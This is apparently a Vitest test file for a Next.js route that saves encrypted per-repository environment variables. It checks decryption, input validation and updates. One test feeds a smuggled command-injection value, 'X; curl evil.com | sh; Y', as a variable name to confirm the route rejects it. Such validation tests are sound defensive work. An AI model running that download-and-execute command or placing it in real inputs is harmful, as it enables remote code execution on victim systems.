import { describe, it, expect, vi, beforeEach } from "vitest"

// Mock the prisma singleton so route logic can be exercised without a DB.
// `vi.hoisted` lets the factory (which is hoisted above imports) see the mocks.
const { environment } = vi.hoisted(() => ({
  environment: {
    findFirst: vi.fn(),
    findMany: vi.fn(),
    create: vi.fn(),
    update: vi.fn(),
  },
}))
vi.mock("@/lib/db/prisma", () => ({ prisma: { environment } }))

vi.mock("@/lib/db/api-helpers", () => ({
  requireAuth: vi.fn(async () => ({ userId: "u1" })),
  isAuthError: vi.fn(() => false),
  badRequest: vi.fn((message: string) => Response.json({ error: message }, { status: 400 })),
  internalError: vi.fn((error: unknown) =>
    Response.json({ error: String(error) }, { status: 500 })
  ),
}))

import { GET, PATCH } from "./route"
import { encryptEnvironmentVariables, decryptEnvironmentVariables } from "@/lib/environments"

beforeEach(() => {
  environment.findFirst.mockReset()
  environment.findMany.mockReset()
  environment.create.mockReset()
  environment.update.mockReset()
})

describe("GET /api/user/repo-env", () => {
  it("returns repoEnvironmentVariables shaped from default environments only, decrypted", async () => {
    const encrypted = encryptEnvironmentVariables({ FOO: "bar" })
    environment.findMany.mockResolvedValueOnce([
      { repo: "acme/app", environmentVariables: encrypted },
      { repo: "acme/other", environmentVariables: null },
    ])

    const res = await GET()
    const body = await res.json()

    expect(environment.findMany).toHaveBeenCalledWith({
      where: { userId: "u1", isDefault: true },
      select: { repo: true, environmentVariables: true },
    })
    expect(body).toEqual({
      repoEnvironmentVariables: {
        "acme/app": { FOO: "bar" },
        "acme/other": {},
      },
    })
  })
})

describe("PATCH /api/user/repo-env", () => {
  function makeRequest(body: unknown) {
    return new Request("http://localhost/api/user/repo-env", {
      method: "PATCH",
      body: JSON.stringify(body),
    }) as unknown as import("next/server").NextRequest
  }

  it("rejects a missing repo", async () => {
    const res = await PATCH(makeRequest({ environmentVariables: {} }))
    expect(res.status).toBe(400)
  })

  it("rejects invalid environmentVariables", async () => {
    const res = await PATCH(makeRequest({ repo: "acme/app" }))
    expect(res.status).toBe(400)
  })

  it("rejects a variable name with a shell metacharacter, naming the offending key", async () => {
    const res = await PATCH(
      makeRequest({
        repo: "acme/app",
        environmentVariables: { "X; curl evil.com | sh; Y": "1" },
      })
    )
    const body = await res.json()

    expect(res.status).toBe(400)
    expect(body.error).toContain("X; curl evil.com | sh; Y")
    expect(environment.update).not.toHaveBeenCalled()
  })

  it("rejects a variable name starting with a digit", async () => {
    const res = await PATCH(
      makeRequest({ repo: "acme/app", environmentVariables: { "9FOO": "1" } })
    )
    const body = await res.json()

    expect(res.status).toBe(400)
    expect(body.error).toContain("9FOO")
    expect(environment.update).not.toHaveBeenCalled()
  })

  it("round-trips values through encrypt/decrypt against the repo's default environment", async () => {
    environment.findFirst.mockResolvedValueOnce({
      id: "env1",
      name: "Default",
      repo: "acme/app",
      isDefault: true,
      networkMode: "full",
      allowedDomains: [],
      environmentVariables: null,
      setupScript: null,
    })
    environment.update.mockResolvedValueOnce({})

    const res = await PATCH(
      makeRequest({ repo: "acme/app", environmentVariables: { FOO: "bar" } })
    )

    expect(res.status).toBe(200)
    expect(environment.update).toHaveBeenCalledTimes(1)
    const call = environment.update.mock.calls[0][0]
    expect(call.where).toEqual({ id: "env1" })
    const written = call.data.environmentVariables as Record<string, string>
    expect(decryptEnvironmentVariables(written)).toEqual({ FOO: "bar" })
  })

  it("clears the default environment's variables without deleting the row", async () => {
    environment.findFirst.mockResolvedValueOnce({
      id: "env1",
      name: "Default",
      repo: "acme/app",
      isDefault: true,
      networkMode: "full",
      allowedDomains: [],
      environmentVariables: { FOO: "encrypted" },
      setupScript: null,
    })
    environment.update.mockResolvedValueOnce({})

    const res = await PATCH(
      makeRequest({ repo: "acme/app", environmentVariables: {} })
    )

    expect(res.status).toBe(200)
    expect(environment.update).toHaveBeenCalledWith({
      where: { id: "env1" },
      data: { environmentVariables: {} },
    })
  })
})
